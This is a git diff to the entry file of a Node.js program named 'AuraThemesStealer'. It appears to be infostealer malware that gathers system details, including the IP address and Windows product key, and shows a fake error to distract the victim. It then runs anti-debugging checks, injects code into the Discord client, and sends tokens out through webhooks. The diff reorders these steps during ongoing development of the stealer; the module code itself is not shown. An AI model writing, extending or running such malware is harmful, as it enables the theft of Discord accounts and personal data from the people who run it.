@@ -1,3 +1,5 @@
+require("dotenv").config();
+
 const { error } = require("./utils/console/error");
 const { getInfo } = require("./modules/core/core");
 const { discordInjected } = require("./modules/injections/discord");
@@ -7,16 +9,15 @@ const { antidebug } = require("./modules/antidebug/antidebug");
 
 const config = require("./config/config")();
 
-require("dotenv").config();
-
 class AuraThemesStealer {
     constructor() {
         this.aurita();
     }
     async aurita() {
         try {
-            await fakeError(config.fakeErrorMessage);
             const { DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION } = await getInfo();
+            
+            await fakeError(config.fakeErrorMessage);
             await antidebug(config.debugger, DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION);
             await discordInjected(config.injection);
             await webhookTokens();
@@ -29,3 +30,4 @@ class AuraThemesStealer {
 new AuraThemesStealer();
 
 error();
+
